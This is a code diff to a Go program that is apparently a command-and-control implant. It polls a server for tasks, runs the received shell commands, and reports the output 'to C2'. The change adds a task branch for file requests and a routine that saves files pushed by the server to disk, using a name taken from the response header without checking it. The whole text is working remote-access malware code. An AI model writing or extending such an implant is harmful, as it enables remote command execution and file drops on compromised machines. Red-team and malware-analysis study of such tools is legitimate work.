@@ -22,7 +22,9 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"io/ioutil"
+	"mime"
 	"net/http"
 	"net/url"
 	"os"
@@ -93,12 +95,18 @@ func taskLoop() {
 			task, ok := getTask()
 			if ok {
 				tuid := task["tuid"].(string)
-				request := task["cmd"].(string)
-				fmt.Println("Got Task:" + tuid)
-				cmdOut := runCmd(10, request)
-				fmt.Println("Executed command: " + request)
-				sendResult(tuid, cmdOut)
-				fmt.Println("Sent command results to C2")
+				if val, ok := task["cmd"]; ok {
+					request := val.(string)
+					fmt.Println("Got Task:" + tuid)
+					cmdOut := runCmd(10, request)
+					fmt.Println("Executed command: " + request)
+					sendResult(tuid, cmdOut)
+					fmt.Println("Sent command results to C2")
+				} else if val, ok := task["get"]; ok {
+					path := val.(string)
+					fmt.Println("Got request for: " + path)
+
+				}
 			}
 		}
 	}
@@ -123,10 +131,23 @@ func getTask() (map[string]interface{}, bool) {
 	if response.StatusCode == 204 {
 		return nil, false
 	} else if response.StatusCode == 200 {
-		data, _ := ioutil.ReadAll(response.Body)
-		var task map[string]interface{}
-		json.Unmarshal([]byte(data), &task)
-		return task, true
+		t := response.Header.Get("Content-type")
+		if t == "application/json" {
+			data, _ := ioutil.ReadAll(response.Body)
+			var task map[string]interface{}
+			json.Unmarshal([]byte(data), &task)
+			return task, true
+		}
+		// file download
+		disp := response.Header.Get("Content-Disposition")
+		_, p, _ := mime.ParseMediaType(disp)
+		name := p["filename"]
+		temp := "~" + name
+		out, _ := os.Create(temp)
+		defer out.Close()
+		io.Copy(out, response.Body)
+		os.Rename(temp, name)
+		println("Downloaded " + name)
 	}
 	return nil, false
 }
